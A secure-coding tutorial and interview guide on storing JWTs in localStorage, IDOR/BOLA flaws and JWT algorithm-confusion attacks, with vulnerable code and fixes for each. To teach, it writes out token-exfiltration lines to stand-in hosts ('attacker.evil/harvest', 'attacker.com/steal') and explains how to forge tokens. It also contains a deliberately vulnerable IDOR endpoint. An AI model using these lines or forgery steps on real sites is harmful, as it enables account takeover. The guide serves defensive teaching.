# Insecure Token Storage and Broken Authentication Anti-Patterns

## 1. What is it?
**Insecure Token Storage and Broken Authentication** encompass critical application security design flaws where authentication tokens (such as JSON Web Tokens - JWTs, OAuth tokens, and session identifiers) are stored in client-accessible browser storage or validated improperly on the server.

The most notorious client-side mistake is storing access and refresh tokens inside browser `localStorage` or `sessionStorage`. Any script running on the page—including compromised third-party analytics libraries, CDN-hosted dependencies, or Cross-Site Scripting (XSS) vectors—can read `window.localStorage.getItem('token')` and exfiltrate the credentials to an attacker's command-and-control server.

On the server side, **Broken Object-Level Authorization (BOLA / IDOR)** and **Improper JWT Verification** allow attackers to impersonate other users simply by swapping IDs in request payloads or exploiting cryptographic verification flaws (such as algorithm confusion or unverified signatures).

```
   INSECURE LOCALSTORAGE EXPOSURE (XSS ATTACK VECTOR)
   
   ┌────────────────────────────────────────────────────────┐
   │ BROWSER RUNTIME MEMORY                                 │
   │                                                        │
   │   Malicious XSS Script (via compromised npm package)   │
   │            │                                           │
   │            ▼                                           │
   │   const token = localStorage.getItem('jwt');           │
   │            │                                           │
   │            ▼                                           │
   │   fetch('https://attacker.evil/harvest', {             │
   │     method: 'POST',                                    │
   │     body: token                                        │
   │   });                                                  │
   │                                                        │
   │   Result: Permanent account takeover until JWT expires │
   └────────────────────────────────────────────────────────┘
```

---

## 2. Why does it exist?
1. **Developer Convenience vs. Security Hygiene:**
   `localStorage.setItem('token', jwt)` requires only one line of JavaScript. Sending an `Authorization: Bearer <token>` header in an Axios or Fetch interceptor seems easier than setting up HTTP-only cookies with CORS, SameSite policies, and CSRF protection.
2. **Stateless JWT Hype:**
   Tutorials frequently promote "stateless JWTs" without explaining that a stateless token cannot be revoked before its expiration date without maintaining a revocation list (blocklist) in Redis or a database.
3. **Implicit Trust in Client Identifiers (IDOR / BOLA):**
   Endpoints such as `GET /api/documents/:documentId` or `PUT /api/users/:userId` frequently query the database using the route parameter without verifying that the authenticated user actually owns that resource.
4. **JWT Library Misconfiguration:**
   Libraries allowing `alg: "none"` or failing to enforce symmetric vs. asymmetric signature algorithms (e.g., verifying an RSA-signed token using the HMAC-SHA256 algorithm with the public key as the secret).

---

## 3. Mental Model
Think of authentication tokens as **Valuable Physical Master Keys**:

```
                       HOTEL KEYCARD ANALOGY
                       
  ❌ The localStorage Approach (Taping the Keycard to the Outside Door):
     - Anyone walking down the hallway (any JavaScript script or injected script)
       can pick up the keycard and duplicate it.

  ✅ The HttpOnly, Secure, SameSite Cookie Approach (The Sealed Safe Deposit Box):
     - The keycard is kept in a sealed pneumatic tube operated exclusively by the hotel
       staff (the browser's network layer).
     - Neither the guest nor any visitor (JavaScript running in the DOM) can ever touch
       or inspect the key.
     - When an authorized request is sent to the hotel desk, the browser automatically
       delivers the keycard behind the scenes.
```

---

## 4. Basic Example

### The Anti-Pattern: Storing Tokens in `localStorage`
```javascript
// ❌ INSECURE: Saving JWT in localStorage
async function loginUser(email, password) {
  const res = await fetch('/api/login', {
    method: 'POST',
    body: JSON.stringify({ email, password })
  });
  const data = await res.json();
  
  // Vulnerable to any XSS payload on the entire domain!
  localStorage.setItem('authToken', data.token);
}

// Any XSS snippet can execute:
// new Image().src = `http://attacker.com/steal?t=${localStorage.getItem('authToken')}`;
```

### The Fix: Server-Issued `HttpOnly` Cookie
```typescript
// ✅ SECURE: Express backend sets an HttpOnly, Secure, SameSite cookie
import { Response } from 'express';

export function sendAuthTokenCookie(res: Response, token: string) {
  res.cookie('auth_token', token, {
    httpOnly: true,              // Inaccessible to document.cookie & JavaScript!
    secure: process.env.NODE_ENV === 'production', // Only transmitted over HTTPS
    sameSite: 'lax',             // Protects against Cross-Site Request Forgery (CSRF)
    maxAge: 15 * 60 * 1000,      // 15-minute short lifespan
    path: '/'
  });
}
```

---

## 5. Real Example: Broken Object Level Authorization (IDOR) and Fix

### The Vulnerability: IDOR in Profile Update
```typescript
// ❌ VULNERABLE: Trusting the URL ID parameter without tenancy ownership validation
app.put('/api/users/:id/billing', authenticateUser, async (req, res) => {
  const targetUserId = req.params.id; // Any user can pass another user's UUID!
  const { creditCardNumber } = req.body;

  // Flaw: Updates whoever is in the URL parameter, regardless of req.user.id!
  await db.query(
    'UPDATE billing_details SET card_number = $1 WHERE user_id = $2',
    [creditCardNumber, targetUserId]
  );

  res.json({ success: true });
});
```

### The Remediation: Strict Claims Validation and Ownership Scoping
```typescript
// ✅ SECURE: Enforcing user ownership directly from verified token claims
import { Request, Response } from 'express';

interface AuthenticatedRequest extends Request {
  user?: {
    id: string;
    role: 'USER' | 'ADMIN';
  };
}

export async function updateBilling(req: AuthenticatedRequest, res: Response) {
  const requestedUserId = req.params.id;
  const currentAuthUser = req.user;

  if (!currentAuthUser) {
    return res.status(401).json({ error: 'Unauthenticated' });
  }

  // Prevent IDOR: Normal users can ONLY modify their OWN billing records
  if (currentAuthUser.role !== 'ADMIN' && currentAuthUser.id !== requestedUserId) {
    // Return 403 Forbidden or 404 to avoid leaking existence of user IDs
    return res.status(403).json({ error: 'Access denied: Resource ownership violation' });
  }

  const { creditCardNumber } = req.body;

  const result = await db.query(
    `UPDATE billing_details 
     SET card_number = $1, updated_at = NOW() 
     WHERE user_id = $2 
     RETURNING id`,
    [creditCardNumber, requestedUserId]
  );

  if (result.rowCount === 0) {
    return res.status(404).json({ error: 'Billing profile not found' });
  }

  return res.json({ success: true });
}
```

---

## 6. Under the Hood: The Browser Cookie Sandbox vs. DOM Storage

```
+-------------------------------------------------------------------------------+
| BROWSER SANDBOX ARCHITECTURE                                                  |
|                                                                               |
|  DOM Execution Context (JavaScript Engine)                                     |
|  ├── window.localStorage  <──── Accessible to any JS / XSS script            |
|  ├── window.sessionStorage <──── Accessible to any JS / XSS script            |
|  └── document.cookie      <──── Accessible unless marked HttpOnly             |
|                                                                               |
|  Browser Protected Cookie Jar (C++ Networking Layer)                           |
|  ┌────────────────────────────────────────────────────────┐                   |
|  │ Cookie: auth_token=eyJhbGciOi...                       │                   |
|  │ Attributes: [HttpOnly] [Secure] [SameSite=Lax]         │                   |
|  │                                                        │                   |
|  │ • Inaccessible to JS execution context.               │                   |
|  │ • Injected into HTTP Request headers automatically     │                   |
|  │   only for matching domain and HTTPS protocols.        │                   |
|  └────────────────────────────────────────────────────────┘                   |
+-------------------------------------------------------------------------------+
```

### JWT Algorithm Confusion (`None` Algorithm & RSA to HMAC Downgrade)
A JWT consists of 3 Base64URL encoded segments: `header.payload.signature`.
1. **The `none` Algorithm Exploit:**
   An attacker decodes the header `{"alg":"HS256","typ":"JWT"}` and changes it to `{"alg":"none","typ":"JWT"}`. If the backend verification library fails to explicitly reject `none`, the attacker strips the signature entirely and creates arbitrary claims (`{"role": "ADMIN"}`).
2. **Asymmetric to Symmetric Key Confusion:**
   When using RS256, the server signs with a private key and verifies with a public key. If the backend uses `jwt.verify(token, key)` without verifying that the header specifies `RS256`, an attacker can change the algorithm to `HS256` and sign the token using the server's **public key** as the HMAC secret! The server computes HMAC-SHA256 using its public key, the signature matches, and authentication succeeds.

---

## 7. Important Rules

1. **Never Store Sensitive Tokens in LocalStorage:**
   `localStorage` persists forever and is completely unprotected against XSS attacks. Store access tokens in memory (React state) or in `HttpOnly`, `Secure`, `SameSite=Strict/Lax` cookies.
2. **Explicitly Specify Allowed JWT Algorithms on the Server:**
   ```typescript
   // Explicitly constrain verification to RS256:
   jwt.verify(token, publicKey, { algorithms: ['RS256'] });
   ```
3. **Always Scope DB Queries by the Authenticated User ID:**
   Never execute: `SELECT * FROM orders WHERE id = $orderId`.
   Always execute: `SELECT * FROM orders WHERE id = $orderId AND user_id = $authUserId`.
4. **Short Access Token Lifespan (5–15 Minutes):**
   Stateless access tokens must have short lifespans. Long-lived refresh tokens must be kept in `HttpOnly` cookies and revoked via database or Redis refresh token rotation.

---

## 8. Common Mistakes

```typescript
// ❌ MISTAKE 1: Parsing JWT without verifying signature
// jwt.decode() DOES NOT VERIFY SIGNATURE! Anyone can forge it!
const payload = jwt.decode(req.headers.authorization);
req.user = payload; // CRITICAL VULNERABILITY!

// ❌ MISTAKE 2: Storing sensitive PII inside JWT payload
// JWT payloads are only Base64 encoded, NOT encrypted!
// payload: { ssn: '123-45-6789', passwordHash: '...' } -> Instantly readable!

// ❌ MISTAKE 3: Rolling your own crypto or password hashing
// Using MD5, SHA-1, or SHA-256 for passwords instead of Argon2id or bcrypt.
```

---

## 9. Best Practices

1. **The BFF (Backend-For-Frontend) Pattern for SPAs:**
   Keep tokens entirely outside the browser. Use a lightweight Node.js/Next.js middleware to manage encrypted session cookies and forward bearer tokens to backend microservices.
2. **Refresh Token Rotation with Reuse Detection:**
   Every time a refresh token is exchanged, invalidate it immediately and issue a new refresh token. If an old refresh token is submitted again, immediately revoke all tokens belonging to that user family (indicating token theft).
3. **Set Complete Cookie Security Flags:**
   ```typescript
   cookieOptions = {
     httpOnly: true,
     secure: true,
     sameSite: 'strict', // or 'lax'
     path: '/api/auth/refresh' // Limit scope to auth endpoints
   };
   ```

---

## 10. Performance Considerations
- **Cryptographic Verification Overhead:** Verifying asymmetric signatures (RS256/ES256) consumes more CPU cycles than symmetric (HS256). For high-throughput internal microservices, use HS256 with long, high-entropy secrets (256+ bits), or cache public keys in memory.
- **Revocation List Lookups:** Checking a Redis blocklist for revoked JWTs on every single API request adds a 0.5ms network roundtrip. Keep access tokens short-lived (5 minutes) so that revocation lookups are only needed on refresh token exchange.

---

## 11. Security Considerations

| Vulnerability | Attack Vector | Primary Defense |
|---|---|---|
| **Cross-Site Scripting (XSS)** | Injected JS reads `localStorage` | Use `HttpOnly` Cookies + Strict CSP |
| **Cross-Site Request Forgery (CSRF)** | Malicious site triggers authenticated POST | `SameSite=Lax/Strict` + Anti-CSRF Double Submit Tokens |
| **BOLA / IDOR** | Attacker changes `?userId=123` to `?userId=124` | Scope SQL queries to `WHERE user_id = req.user.id` |
| **Token Replay** | Stolen refresh token used repeatedly | Refresh Token Rotation + Reuse Detection |

---

## 12. Alternatives

1. **Server-Side Stateful Sessions (Redis / Postgres Sessions):**
   - Instead of JWTs, store an opaque random session ID (e.g., 64 bytes) in an `HttpOnly` cookie.
   - *Pros:* Instant revocation, minimal client footprint, immune to algorithm confusion.
   - *Cons:* Requires a fast database/cache read on every single incoming HTTP request.
2. **Paseto (Platform-Agnostic Security Tokens):**
   - Modern alternative to JWT that eliminates algorithm confusion by design (supports only vetted ciphers).

---

## 13. Trade-offs

| Mechanism | Security | Scalability | Complexity |
|---|---|---|---|
| **LocalStorage JWT** | 🔴 Extremely Poor (XSS vulnerable) | 🟢 Infinite | 🟢 Trivial |
| **HttpOnly Cookie (JWT)** | 🟢 High (XSS safe) | 🟢 Infinite | 🟡 Moderate (CORS/CSRF handling) |
| **Server Sessions (Redis)** | 🟢 Maximum (Instant Revocation) | 🟡 Dependent on Redis capacity | 🟡 Requires state store |

---

## 14. Real-World Usage
- **Auth0 / Okta / Supabase:** Employs refresh token rotation and strongly warns developers against persisting access tokens in `localStorage`.
- **Uber / GitHub:** Enforces strict BOLA checks across all public and internal REST/GraphQL endpoints using attribute-based access control (ABAC).

---

## 15. Placement Interview Questions

### Basic
1. *Why should you never store JWT access tokens in browser `localStorage`?*
   - **Answer:** `localStorage` is completely accessible to any JavaScript executing within the same origin. If the web app has an XSS vulnerability or a compromised third-party npm package, attackers can steal the token with one line of code. `HttpOnly` cookies protect tokens from JavaScript access.

### Conceptual
2. *What is Broken Object-Level Authorization (BOLA/IDOR), and why is it ranked #1 in OWASP API Security?*
   - **Answer:** BOLA occurs when an API endpoint uses user-supplied input (like an ID in the URL) to access a database object without verifying whether the requesting user has the authorization to access that object. It is #1 because it is extremely common and leads to massive data breaches.

### Implementation
3. *How do you implement Refresh Token Rotation with token reuse detection?*
   - **Answer:** In the database, store refresh tokens with a `family_id` and an `is_revoked` boolean. When a token is refreshed, mark it as revoked and issue a new one. If a token that is already marked revoked is presented, an attacker has intercepted an old token—immediately invalidate the entire token family, forcing all sessions to log out.

### Debugging
4. *A developer complains that their `HttpOnly` cookie is not being sent from their React frontend (localhost:3000) to their Express API (localhost:5000). How do you fix it?*
   - **Answer:**
     1. In the React client, set `credentials: 'include'` (Fetch) or `withCredentials: true` (Axios).
     2. In the Express CORS config, set `origin: 'http://localhost:3000'` (NOT `'*'`) and `credentials: true`.
     3. Ensure `SameSite` is not set to `Strict` if cross-site, or use `Lax`/`None` (with `Secure: true` over HTTPS).

### Scenario
5. *How do you revoke a stateless JWT immediately if a user's laptop is stolen?*
   - **Answer:** Stateless JWTs cannot be revoked natively until they expire. To revoke immediately:
     1. Maintain a Redis blocklist of revoked `jti` (JWT ID) claims with a TTL matching the token's remaining lifespan.
     2. Alternatively, store a `token_version` integer on the user table; increment it on logout and embed it in the JWT; if the JWT version doesn't match the DB version, reject it.

### Advanced
6. *Explain the JWT RSA to HMAC Key Confusion attack.*
   - **Answer:** (See Section 6). An attacker alters the JWT header from `RS256` to `HS256`. The server, if configured naively, uses its RS256 public key (which is public knowledge) as the HMAC symmetric secret key to verify the token. The attacker signs the forged token with the public key, bypassing verification completely.

---

## 16. Coding Questions

### Problem: Production-Grade Express Auth Middleware with Ownership Guard
Write a TypeScript middleware verifying JWTs and preventing BOLA/IDOR on document endpoints.

```typescript
import { Request, Response, NextFunction } from 'express';
import jwt from 'jsonwebtoken';

interface UserPayload {
  userId: string;
  role: 'USER' | 'ADMIN';
}

declare global {
  namespace Express {
    interface Request {
      user?: UserPayload;
    }
  }
}

const JWT_PUBLIC_KEY = process.env.JWT_PUBLIC_KEY || 'default-secret';

// 1. Authentication Middleware
export function authenticateToken(req: Request, res: Response, next: NextFunction) {
  // Extract token from HttpOnly cookie first, fallback to Authorization header
  const token = req.cookies?.auth_token || req.headers.authorization?.split(' ')[1];

  if (!token) {
    return res.status(401).json({ error: 'Authentication token missing' });
  }

  try {
    // Explicitly enforce cryptographic algorithm to prevent algorithm confusion
    const decoded = jwt.verify(token, JWT_PUBLIC_KEY, {
      algorithms: ['RS256']
    }) as UserPayload;

    req.user = decoded;
    next();
  } catch (err) {
    return res.status(401).json({ error: 'Invalid or expired token' });
  }
}

// 2. Ownership Authorization Guard (BOLA Defense)
export function requireDocumentOwnership(dbPool: any) {
  return async (req: Request, res: Response, next: NextFunction) => {
    const { documentId } = req.params;
    const currentUser = req.user;

    if (!currentUser) {
      return res.status(401).json({ error: 'Unauthenticated' });
    }

    // Admins bypass ownership checks
    if (currentUser.role === 'ADMIN') {
      return next();
    }

    try {
      const query = 'SELECT user_id FROM documents WHERE id = $1';
      const { rows } = await dbPool.query(query, [documentId]);

      if (rows.length === 0) {
        return res.status(404).json({ error: 'Document not found' });
      }

      if (rows[0].user_id !== currentUser.userId) {
        // Return 403 Forbidden to prevent unauthorized access
        return res.status(403).json({ error: 'Access forbidden: You do not own this document' });
      }

      next();
    } catch (error) {
      return res.status(500).json({ error: 'Database authorization verification error' });
    }
  };
}
```

---

## 17. Common Interview Traps
- **Trap 1:** "JWTs are secure because they are encrypted."
  *Reality:* Standard JWTs are **signed**, not encrypted. Anyone can decode the payload on `jwt.io` without a key. Never put passwords, credit cards, or confidential secrets into a JWT payload.
- **Trap 2:** "Setting `HttpOnly` on a cookie makes you immune to all attacks."
  *Reality:* `HttpOnly` stops XSS from stealing the cookie, but it does **not** stop CSRF! You must still configure `SameSite: 'Lax'` or use CSRF tokens.
- **Trap 3:** "Base64 encoding is encryption."
  *Reality:* Base64 is merely a binary-to-text encoding format, easily decoded with zero keys.

---

## 18. Revision Summary
- **Storage Rule:** Never use `localStorage` for authentication tokens. Always use `HttpOnly`, `Secure`, `SameSite` cookies or in-memory React state with BFF.
- **BOLA / IDOR:** Validate resource ownership on every single parameterized query (`WHERE id = $id AND user_id = $userId`).
- **Algorithm Enforcement:** Always specify `{ algorithms: ['RS256'] }` explicitly during `jwt.verify()`.
- **Token Strategy:** Keep access tokens short-lived (15 minutes). Use refresh token rotation with reuse detection for long-lived sessions.

---

## 19. Quick Reference

```
┌──────────────────────────────────────┬──────────────────────────────────────────┐
│ SECURITY FLAW                        │ REMEDIATION PATTERN                      │
├──────────────────────────────────────┼──────────────────────────────────────────┤
│ Storing JWT in localStorage          │ HttpOnly, Secure, SameSite=Lax Cookie    │
│ Trusting ID parameter in URL (BOLA)  │ Scope SQL query to req.user.userId       │
│ Missing algorithm in jwt.verify      │ Pass { algorithms: ['RS256'] } option    │
│ Putting PII in JWT payload           │ Keep payload minimal (userId + role)     │
│ Long-lived access tokens             │ 15-minute access token + rotating refresh│
│ Missing CSRF defense on cookies      │ SameSite=Lax + Custom X-Requested-With   │
└──────────────────────────────────────┴──────────────────────────────────────────┘
```
